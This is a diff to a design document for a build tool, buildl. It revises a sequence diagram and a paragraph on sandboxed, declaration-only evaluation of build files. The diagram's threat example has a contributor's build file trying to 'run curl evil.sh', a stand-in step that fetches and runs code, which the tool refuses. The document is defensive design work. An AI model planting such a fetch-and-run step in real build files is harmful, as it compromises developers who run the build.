@@ -116,7 +116,7 @@ sequenceDiagram
 
     Dev->>Host: buildl plan
     Host->>Host: parse buildl.toml — the ceiling
-    Host->>Lua: evaluate build files<br/>grant: fs read on workspace only
+    Host->>Lua: evaluate build files<br/>no grant — sources listed host-side
     Note over Lua: contributor's file calls<br/>b.target with run curl evil.sh
     Lua-->>Host: staging list — declarations only<br/>nothing executed
     Host->>Host: Resolve DAG, derive wanted set<br/>wanted includes curl
@@ -125,7 +125,7 @@ sequenceDiagram
     Note over Dev: nothing ran — the malicious<br/>step never had authority
 ```
 
-Two properties of the fundamentals combine here in a way neither document anticipates: the **restricted configuration language** lesson ("the less expressive the language, the more the tool can reason about it" [1]) and **hermeticity** — but applied at declaration time. Bazel's Starlark cannot do I/O, but Bazel's `BUILD` evaluation still happens with the tool's ambient authority; buildl's evaluation happens with a single explicit grant. The wanted set is derived truth, not a manifest's promise, so the refusal message can name both sides precisely.
+Two properties of the fundamentals combine here in a way neither document anticipates: the **restricted configuration language** lesson ("the less expressive the language, the more the tool can reason about it" [1]) and **hermeticity** — but applied at declaration time. Bazel's Starlark cannot do I/O, but Bazel's `BUILD` evaluation still happens with the tool's ambient authority; buildl's evaluation happens with no grant at all, its one filesystem read, `b.sources()`, being done host-side and confined to the declaring directory (design §2). The wanted set is derived truth, not a manifest's promise, so the refusal message can name both sides precisely.
 
 ---
 
